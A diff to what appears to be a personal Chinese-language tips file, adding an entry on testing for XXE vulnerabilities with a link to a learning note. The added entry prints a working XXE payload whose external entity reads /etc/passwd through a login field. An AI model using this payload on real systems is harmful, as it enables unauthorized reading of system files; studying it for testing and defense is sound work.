@@ -3441,5 +3441,17 @@ $_POST[b]="",是个空字符串,isset返回true
 320.word里面插入高亮代码
     http://www.planetb.ca/syntax-highlight-word
 
+321.xxe漏洞的测试 
+    https://b1ngz.github.io/XXE-learning-note/
+    payload:
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE copyright [
+    <!ENTITY attack SYSTEM "file:///etc/passwd">
+    ]>
+    <reset>
+    <login>&attack;</login>
+    <secret>xxx</secret>
+    </reset>
+
 ```
 
